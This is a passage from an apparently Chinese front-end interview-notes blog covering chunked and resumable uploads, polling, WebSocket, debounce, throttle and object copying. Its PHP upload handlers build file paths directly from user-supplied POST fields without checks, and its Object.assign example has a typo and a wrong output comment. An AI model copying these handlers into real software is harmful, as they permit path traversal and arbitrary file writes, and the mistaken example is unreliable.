根据长度截取每次需要上传的数据</span><br><span class="line"> // File对象继承自Blob对象，因此包含slice方法</span><br><span class="line"> let blob = file.slice(start, end); </span><br><span class="line"> chunks.push(blob)</span><br><span class="line"> start = end;</span><br><span class="line"> end = start + piece;</span><br><span class="line"> &#125;</span><br><span class="line"> return chunks</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将文件拆分成piece大小的分块，然后每次请求只需要上传这一个部分的分块即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let file = document.querySelector(&quot;[name=file]&quot;).files[0];</span><br><span class="line">const LENGTH = 1024 * 1024 * 0.1;</span><br><span class="line">let chunks = slice(file, LENGTH); // 首先拆分切片</span><br><span class="line">chunks.forEach(chunk=&gt;&#123;</span><br><span class="line"> let fd = new FormData();</span><br><span class="line"> fd.append(&quot;file&quot;, chunk);</span><br><span class="line"> post(&#x27;/mkblk.php&#x27;, fd)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>服务器接收到这些切片后，再将他们拼接起来就可以了，下面是PHP拼接切片的示例代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$filename = &#x27;./upload/&#x27; . $_POST[&#x27;filename&#x27;];//确定上传的文件名</span><br><span class="line">//第一次上传时没有文件，就创建文件，此后上传只需要把数据追加到此文件中</span><br><span class="line">if(!file_exists($filename))&#123;</span><br><span class="line"> move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;],$filename);</span><br><span class="line">&#125;else&#123;</span><br><span class="line"> file_put_contents($filename,file_get_contents($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]),FILE_APPEND);</span><br><span class="line"> echo $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试时<font color="#FF00FF">记得修改nginx的server配置，否则大文件可能会提示413 Request Entity Too Large的错误</font>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    // ...</span><br><span class="line">    client_max_body_size 50m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>上面这种方式来存在一些问题</strong></p><ul><li><font color="#FF00FF">无法识别一个切片是属于哪一个切片的</font>，当同时发生多个请求时，追加的文件内容会出错</li><li>切片上传接口是<font color="#FF00FF">异步的，无法保证服务器接收到的切片是按照请求顺序拼接的</font></li></ul><p>因此接下来我们来看看应该如何在服务端<strong>还原切片</strong>。</p><p>在后端需要将多个相同文件的切片还原成一个文件，上面这种处理切片的做法存在下面几个问题</p><ul><li>如何识别多个切片是来自于同一个文件的，这个可以在每个切片请求上传递一个相同文件的context参数</li><li>如何将多个切片还原成一个文件</li><li>确认所有切片都已上传，这个可以通过客户端在切片全部上传后调用mkfile接口来通知服务端进行拼接</li><li><font color="#FF00FF">找到同一个context下的所有切片</font>，确认每个切片的顺序，这个可以在每个切片上标记一个位置索引值</li><li><font color="#FF00FF">按顺序拼接切</font>片，还原成文件</li></ul><p>上面有一个重要的参数，即context，我们<font color="#FF00FF">需要获取为一个文件的唯一标识</font>，可以通过下面两种方式获取</p><ul><li>根据文件名、文件长度等基本信息进行拼接，为了避免多个用户上传相同的文件，可以再额外拼接用户信息如uid等保证唯一性</li><li>根据文件的二进制内容计算<font color="#FF00FF">文件的hash</font>，这样只要文件内容不一样，则标识也会不一样，缺点在于计算量比较大.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// 获取context，同一个文件会返回相同的值</span><br><span class="line">function createContext(file) &#123;</span><br><span class="line">     return file.name + file.length</span><br><span class="line">&#125;</span><br><span class="line">let file = document.querySelector(&quot;[name=file]&quot;).files[0];</span><br><span class="line">const LENGTH = 1024 * 1024 * 0.1;</span><br><span class="line">let chunks = slice(file, LENGTH);</span><br><span class="line">// 获取对于同一个文件，获取其的context</span><br><span class="line">let context = createContext(file);</span><br><span class="line">let tasks = [];</span><br><span class="line">chunks.forEach((chunk, index) =&gt; &#123;</span><br><span class="line"> let fd = new FormData();</span><br><span class="line"> fd.append(&quot;file&quot;, chunk);</span><br><span class="line"> // 传递context</span><br><span class="line"> fd.append(&quot;context&quot;, context);</span><br><span class="line"> // 传递切片索引值</span><br><span class="line"> fd.append(&quot;chunk&quot;, index + 1);</span><br><span class="line"></span><br><span class="line"> tasks.push(post(&quot;/mkblk.php&quot;, fd));</span><br><span class="line">&#125;);</span><br><span class="line">// 所有切片上传完毕后，调用mkfile接口</span><br><span class="line">Promise.all(tasks).then(res =&gt; &#123;</span><br><span class="line"> let fd = new FormData();</span><br><span class="line"> fd.append(&quot;context&quot;, context);</span><br><span class="line"> fd.append(&quot;chunks&quot;, chunks.length);</span><br><span class="line"> post(&quot;/mkfile.php&quot;, fd).then(res =&gt; &#123;</span><br><span class="line"> console.log(res);</span><br><span class="line"> &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在mkblk.php接口中，我们通过context来保存同一个文件相关的切片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// mkblk.php</span><br><span class="line">$context = $_POST[&#x27;context&#x27;];</span><br><span class="line">$path = &#x27;./upload/&#x27; . $context;</span><br><span class="line">if(!is_dir($path))&#123;</span><br><span class="line"> mkdir($path);</span><br><span class="line">&#125;</span><br><span class="line">// 把同一个文件的切片放在相同的目录下</span><br><span class="line">$filename = $path .&#x27;/&#x27;. $_POST[&#x27;chunk&#x27;];</span><br><span class="line">$res = move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;],$filename);</span><br></pre></td></tr></table></figure><p>除了上面这种简单通过目录区分切片的方法之外，还可以将切片信息保存在数据库来进行索引。接下来是mkfile.php接口的实现，这个接口会在所有切片上传后调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// mkfile.php</span><br><span class="line">$context = $_POST[&#x27;context&#x27;];</span><br><span class="line">$chunks = (int)$_POST[&#x27;chunks&#x27;];</span><br><span class="line">//合并后的文件名</span><br><span class="line">$filename = &#x27;./upload/&#x27; . $context . &#x27;/file.jpg&#x27;; </span><br><span class="line">for($i = 1; $i &lt;= $chunks; ++$i)&#123;</span><br><span class="line"> $file = &#x27;./upload/&#x27;.$context. &#x27;/&#x27; .$i; // 读取单个切块</span><br><span class="line"> $content = file_get_contents($file);</span><br><span class="line"> if(!file_exists($filename))&#123;</span><br><span class="line"> $fd = fopen($filename, &quot;w+&quot;);</span><br><span class="line"> &#125;else&#123;</span><br><span class="line"> $fd = fopen($filename, &quot;a&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"> fwrite($fd, $content); // 将切块合并到一个文件上</span><br><span class="line">&#125;</span><br><span class="line">echo $filename;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="断点续传"><a href="#断点续传" class="headerlink" title="断点续传"></a>断点续传</h3><p>即使将大文件拆分成切片上传，我们仍需等待所有切片上传完毕，在等待过程中，可能发生一系列导致部分切片上传失败的情形，如网络故障、页面关闭等。由于切片未全部上传，因此无法通知服务端合成文件。这种情况下可以通过<strong>断点续传</strong>来进行处理。</p><p>断点续传指的是：可以从已经上传部分开始继续上传未完成的部分，而没有必要从头开始上传，节省上传时间。</p><p>由于整个上传过程是按<font color="#FF00FF">切片维度</font>进行的，且mkfile接口是在所有切片上传完成后由客户端主动调用的，因此断点续传的实现也十分简单：</p><ul><li>在切片上传成功后，保存已上传的切片信息</li><li>当下次传输相同文件时，遍历切片列表，只选择未上传的切片进行上传</li><li>所有切片上传完毕后，再调用mkfile接口通知服务端进行文件合并</li></ul><p>因此问题就落在了如何保存已上传切片的信息了，保存一般有两种策略</p><ul><li>可以通过locaStorage等方式保存在前端浏览器中，<font color="#FF00FF">这种方式不依赖于服务端，实现起来也比较方便，缺点在于如果用户清除了本地文件，会导致上传记录丢失</font></li><li>服务端本身知道哪些切片已经上传，因此可以由<font color="#FF00FF">服务端额外提供一个根据文件context查询已上传切片的接口，在上传文件前调用该文件的历史上传记录</font></li></ul><p><strong>通过在本地保存已上传切片记录，来实现断点上传的功能</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 获取已上传切片记录</span><br><span class="line">function getUploadSliceRecord(context)&#123;</span><br><span class="line"> let record = localStorage.getItem(context)</span><br><span class="line"> if(!record)&#123;</span><br><span class="line"> return []</span><br><span class="line"> &#125;else &#123;</span><br><span class="line"> try&#123;</span><br><span class="line"> return JSON.parse(record)</span><br><span class="line"> &#125;catch(e)&#123;&#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 保存已上传切片</span><br><span class="line">function saveUploadSliceRecord(context, sliceIndex)&#123;</span><br><span class="line"> let list = getUploadSliceRecord(context)</span><br><span class="line"> list.push(sliceIndex)</span><br><span class="line"> localStorage.setItem(context, JSON.stringify(list))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后对上传逻辑稍作修改，<font color="#FF00FF">主要是增加上传前检测是已经上传、上传后保存记录的逻辑</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">let context = createContext(file);</span><br><span class="line">// 获取上传记录</span><br><span class="line">let record = getUploadSliceRecord(context);</span><br><span class="line">let tasks = [];</span><br><span class="line">chunks.forEach((chunk, index) =&gt; &#123;</span><br><span class="line"> // 已上传的切片则不再重新上传</span><br><span class="line"> if(record.includes(index))&#123;</span><br><span class="line"> return</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> let fd = new FormData();</span><br><span class="line"> fd.append(&quot;file&quot;, chunk);</span><br><span class="line"> fd.append(&quot;context&quot;, context);</span><br><span class="line"> fd.append(&quot;chunk&quot;, index + 1);</span><br><span class="line"> let task = post(&quot;/mkblk.php&quot;, fd).then(res=&gt;&#123;</span><br><span class="line"> // 上传成功后保存已上传切片记录</span><br><span class="line"> saveUploadSliceRecord(context, index)</span><br><span class="line"> record.push(index)</span><br><span class="line"> &#125;)</span><br><span class="line"> tasks.push(task);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>此时上传时刷新页面或者关闭浏览器，再次上传相同文件时，之前已经上传成功的切片就不会再重新上传了。</p><p>服务端实现断点续传的逻辑基本相似，只要在getUploadSliceRecord内部调用服务端的查询接口获取已上传切片的记录即可，因此这里不再展开。</p><p><strong>此外断点续传还需要考虑切片过期的情况</strong>：<font color="#FF8C00">如果调用了mkfile接口，则磁盘上的切片内容就可以清除掉了，如果客户端一直不调用mkfile的接口，放任这些切片一直保存在磁盘显然是不可靠的，一般情况下，切片上传都有一段时间的有效期，超过该有效期，就会被清除掉。基于上述原因，断点续传也必须同步切片过期的实现逻辑。</font></p><h3 id="上传进度和暂停"><a href="#上传进度和暂停" class="headerlink" title="上传进度和暂停"></a>上传进度和暂停</h3><p>**<font color="#FF8C00">通过xhr.upload中的progress方法可以实现监控每一个切片上传进度</font>**。</p><p>上传暂停的实现也比较简单，<font color="#FF8C00">通过xhr.abort可以取消当前未完成上传切片的上传</font>，实现上传暂停的效果，恢复上传就跟断点续传类似，先获取已上传的切片列表，然后重新发送未上传的切片。</p><h1 id="使用setInterval请求实时数据，返回顺序不一致怎么解决"><a href="#使用setInterval请求实时数据，返回顺序不一致怎么解决" class="headerlink" title="使用setInterval请求实时数据，返回顺序不一致怎么解决"></a>使用setInterval请求实时数据，返回顺序不一致怎么解决</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setInterval(function() &#123;</span><br><span class="line">    $.get(&quot;/path/to/server&quot;, function(data, status) &#123;</span><br><span class="line">        console.log(data);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;, 10000);</span><br></pre></td></tr></table></figure><p>上面的程序会每隔10秒向服务器请求一次数据，并在数据到达后存储。这个实现方法通常可以满足简单的需求，然而同时也存在着很大的<font color="#FF00FF">缺陷</font>：在网络情况不稳定的情况下，服务器从接收请求、发送请求到客户端接收请求的总时间有可能超过10秒，而请求是以10秒间隔发送的，这样会导致接收的数据到达先后顺序与发送顺序不一致。<br><strong>解决方案：</strong></p><ol><li>使用setTimeout代替setInterval</li></ol><p>程序首先设置10秒后发起请求，<strong>当数据返回后</strong>再隔10秒发起第二次请求，以此类推。这样的话虽然无法保证两次请求之间的时间间隔为固定值，但是可以保证到达数据的顺序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function poll() &#123;</span><br><span class="line">    setTimeout(function() &#123;</span><br><span class="line">        $.get(&quot;/path/to/server&quot;, function(data, status) &#123;</span><br><span class="line">            console.log(data);</span><br><span class="line">            // 根据状态判断，发起下一次请求</span><br><span class="line">            poll();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;, 10000);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>WebSocket</li></ol><p>WebSocket 协议本质上是一个<font color="#FF00FF">基于 TCP 的协议</font>。</p><p>为了建立一个 WebSocket 连接，客户端浏览器首先要向服务器发起一个 HTTP 请求，<strong>这个请求和通常的 HTTP 请求不同，包含了一些附加头信息，其中附加头信息”Upgrade: WebSocket”表明这是一个申请协议升级的 HTTP 请求</strong>，服务器端解析这些附加的头信息然后产生应答信息返回给客户端，客户端和服务器端的 WebSocket 连接就建立起来了，双方就可以通过这个连接通道自由的传递信息，并且<font color="#FF00FF">这个连接会持续存在直到客户端或者服务器端的某一方主动的关闭连接。</font></p><p>服务器（Node.js）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var WebSocketServer = require(&#x27;ws&#x27;).Server;</span><br><span class="line">var wss = new WebSocketServer(&#123;port: 8080&#125;);</span><br><span class="line"></span><br><span class="line">wss.on(&quot;connection&quot;, function(socket) &#123;</span><br><span class="line">    socket.on(&quot;message&quot;, function(msg) &#123;</span><br><span class="line">        console.log(msg);</span><br><span class="line">        socket.send(&quot;Nice to meet you!&quot;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>客户端同样可以使用Node.js或者是浏览器实现，这里选用浏览器作为客户端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// WebSocket 为客户端JavaScript的原生对象，浏览器中可用</span><br><span class="line">const WebSocket = require(&quot;ws&quot;);//控制台中写的所以需要引入ws</span><br><span class="line">var ws = new WebSocket(&quot;ws://localhost:8080&quot;);</span><br><span class="line">ws.onopen = function (event) &#123;</span><br><span class="line">  ws.send(&quot;Hello there!&quot;);</span><br><span class="line">&#125;;</span><br><span class="line">ws.onmessage = function (event) &#123;</span><br><span class="line">  console.log(event.data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="防抖和节流的原理和使用场景"><a href="#防抖和节流的原理和使用场景" class="headerlink" title="防抖和节流的原理和使用场景"></a>防抖和节流的原理和使用场景</h1><p>函数防抖和函数节流：<strong>优化高频率执行js代码的一种手段</strong>，js中的一些事件如浏览器的<font color="#FF8C00">resize、scroll，鼠标的mousemove、mouseover，input输入框的keypress等事件在触发时，会不断地调用绑定在事件上的回调函数</font>，极大地浪费资源，降低前端性能。为了优化体验，需要对这类事件进行调用次数的限制。</p><h2 id="防抖"><a href="#防抖" class="headerlink" title="防抖"></a>防抖</h2><p><font color="#FF8C00">在事件被触发n秒后再执行回调，如果在这n秒内又被触发，则重新计时。</font><br>函数防抖关注一定时间连续触发的事件 <strong>，只在最后执行一次，而函数节流一段时间内只执行一次</strong></p><p>根据函数防抖思路设计出第一版的最简单的防抖代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var timer; // 维护同一个timer</span><br><span class="line">function debounce(fn, delay) &#123;</span><br><span class="line">    clearTimeout(timer);</span><br><span class="line">    timer = setTimeout(function()&#123;</span><br><span class="line">        fn();</span><br><span class="line">    &#125;, delay);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面例子中的debounce就是防抖函数，在document中鼠标移动的时候，会在onmousemove最后触发的1s后执行回调函数testDebounce；如果我们一直在浏览器中移动鼠标（比如10s），会发现会在10 + 1s后才会执行testDebounce函数（因为clearTimeout(timer)），这个就是函数防抖。</p><p>在上面的代码中，会出现一个问题，<font color="#FF00FF">var timer只能在setTimeout的父级作用域中，这样才是同一个timer，并且为了方便防抖函数的调用和回调函数fn的传参问题</font>，我们应该用闭包来解决这些问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function debounce(fn, delay) &#123;</span><br><span class="line">  let timer = null; // 维护一个 timer</span><br><span class="line">  return function () &#123;</span><br><span class="line">    var _this = this; // 取debounce执行作用域的this</span><br><span class="line">    var args = arguments;</span><br><span class="line">    if (timer) &#123;</span><br><span class="line">      clearTimeout(timer);</span><br><span class="line">    &#125;</span><br><span class="line">    timer = setTimeout(function () &#123;</span><br><span class="line">      fn.apply(_this, args); // 用apply指向调用debounce的对象，相当于_this.fn(args);</span><br><span class="line">    &#125;, delay);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function sayHello() &#123;</span><br><span class="line">  console.log(&quot;a, b, c&quot;);</span><br><span class="line">&#125;</span><br><span class="line">console.time(&quot;a&quot;);</span><br><span class="line">let db = debounce(sayHello, 1000);</span><br><span class="line">db();</span><br><span class="line">console.timeEnd(&quot;a&quot;);</span><br><span class="line"></span><br><span class="line">//a: 1ms</span><br><span class="line">//a: 0.952ms</span><br><span class="line">//a, b, c</span><br></pre></td></tr></table></figure><p>使用闭包后，解决传参和封装防抖函数的问题，这样就可以在其他地方随便将需要防抖的函数传入debounce了。</p><h2 id="节流"><a href="#节流" class="headerlink" title="节流"></a>节流</h2><p>连续触发事件，但是在具体的间隔秒数中只执行一次.</p><ul><li>定时器实现节流函数：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function throttle(fn, delay) &#123;</span><br><span class="line">    var timer;</span><br><span class="line">    return function () &#123;</span><br><span class="line">        var _this = this;</span><br><span class="line">        var args = arguments;</span><br><span class="line">        if (timer) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        timer = setTimeout(function () &#123;</span><br><span class="line">            fn.apply(_this, args);</span><br><span class="line">            timer = null; // 在delay后执行完fn之后清空timer，此时timer为假，throttle触发可以进入计时器</span><br><span class="line">        &#125;, delay)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>时间戳实现节流函数：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function throttle(fn, delay) &#123;</span><br><span class="line">    var previous = 0;</span><br><span class="line">    // 使用闭包返回一个函数并且用到闭包函数外面的变量previous</span><br><span class="line">    return function() &#123;</span><br><span class="line">        var _this = this;</span><br><span class="line">        var args = arguments;</span><br><span class="line">        var now = new Date();</span><br><span class="line">        if(now - previous &gt; delay) &#123;</span><br><span class="line">            fn.apply(_this, args);</span><br><span class="line">            previous = now;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="异同比较"><a href="#异同比较" class="headerlink" title="异同比较"></a>异同比较</h2><p><strong>相同点：</strong></p><ul><li>都可以通过使用 setTimeout 实现。</li><li>目的都是，降低回调执行频率。节省计算资源。</li></ul><p><strong>不同点：</strong></p><ul><li>函数防抖，<strong>在一段连续操作结束后，处理回调</strong>，<strong>利用clearTimeout 和 setTimeout实现</strong>。函数节流，<strong>在一段连续操作中，每一段时间只执行一次，</strong> 频率较高的事件中使用来提高性能。</li><li>函数防抖关注一定时间连续触发的事件只在最后执行一次，而函数节流侧重于一段时间内只执行一次。</li></ul><p><strong>常见应用场景</strong></p><p>函数<font color="#FF8C00">防抖</font>的应用场景:</p><p>连续的事件，只需触发一次回调的场景有：</p><ul><li>搜索框搜索输入。只需用户最后一次输入完，再发送请求</li><li>手机号、邮箱验证输入检测</li><li>窗口大小Resize。只需窗口调整完成后，计算窗口大小。防止重复渲染。</li></ul><p>函数<font color="#FF8C00">节流</font>的应用场景:</p><p>间隔一段时间执行一次回调的场景有：</p><ul><li><strong>滚动加载</strong>，加载更多或滚到底部监听</li><li>谷歌搜索框，搜索联想功能</li><li>高频点击提<strong>交，表单重复提交</strong></li></ul><h1 id="浅拷贝，深拷贝-实现方式"><a href="#浅拷贝，深拷贝-实现方式" class="headerlink" title="浅拷贝，深拷贝(实现方式)"></a>浅拷贝，深拷贝(实现方式)</h1><p>浅拷贝和深拷贝都只针对于引用数据类型，浅拷贝只复制指向某个对象的指针，而不复制对象本身，新旧对象还是共享同一块内存；但深拷贝会另外创造一个一模一样的对象，新对象跟原对象不共享内存，修改新对象不会改到原对象；</p><p>区别：浅拷贝只复制对象的第一层属性、深拷贝可以对对象的属性进行<font color="#FF8C00">递归复制</font>；</p><h2 id="实现浅拷贝方法"><a href="#实现浅拷贝方法" class="headerlink" title="实现浅拷贝方法"></a>实现浅拷贝方法</h2><ol><li>Object.assign方法</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;</span><br><span class="line">    a: 1,</span><br><span class="line">    b: 2</span><br><span class="line">&#125;</span><br><span class="line">var obj1 = Object.assign(&#123;&#125;,obj);</span><br><span class="line">boj1.a = 3;</span><br><span class="line">console.log(obj.a) // 3</span><br></pre></td></tr></table></figure><ol start="2"><li>for in方法</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// 只复制第一层的浅拷贝</span><br><span class="line">function simpleCopy(obj1) &#123;</span><br><span class="line">   var obj2 = Array.isArray(obj1) ? [] : &#123;&#125;;</span><br><span class="line">   for (let i in obj1) &#123;</span><br><span class="line">   obj2[i] = obj1[i];</span><br><span class="line">  &#125;</span><br><span class="line">   return obj2;</span><br><span class="line">&#125;</span><br><span class="line">var obj1 = &#123;</span><br><span class="line">   a: 1,</span><br><span class="line">   b: 2,</span><br><span class="line">   c: &#123;</span><br><span class="line">         d: 3</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line">var obj2 = simpleCopy(obj1);</span><br><span class="line">obj2.a = 3;</span><br><span class="line">obj2.c.d = 4;</span><br><span class="line">alert(obj1.a); // 1</span><br><span class="line">alert(obj2.a); // 3</span><br><span class="line">alert(obj1.c.d); // 4</span><br><span class="line">alert(obj2.c.d); // 4</span><br></pre></td></tr></table></figure><h2 id="实现深拷贝方法"><a href="#实现深拷贝方法" class="headerlink" title="实现深拷贝方法"></a>实现深拷贝方法</h2><ol><li>采用递归去拷贝所有层级属性</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function deepClone(obj)&#123;</span><br><span class="line">    let objClone = Array.isArray(obj)?[]:&#123;&#125;;</span><br><span class="line">    if(obj &amp;&amp; typeof obj===&quot;object&quot;)&#123;</span><br><span class="line">        for(key in obj)&#123;</span><br><span class="line">            if(obj.hasOwnProperty(key))&#123;</span><br><span class="line">                //判断ojb子元素是否为对象，如果是，递归复制</span><br><span class="line">                if(obj[key]&amp;&amp;typeof obj[key] ===&quot;object&quot;)&#123;</span><br><span class="line">                    objClone[key] = deepClone(obj[key]);</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    //如果不是，简单复制</span><br><span class="line">                    objClone[key] = obj[key];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return objClone;</span><br><span class="line">&#125;    </span><br><span class="line">let a=[1,2,3,4],</span><br><span class="line">    b=deepClone(a);</span><br><span class="line">a[0]=2;</span><br><span 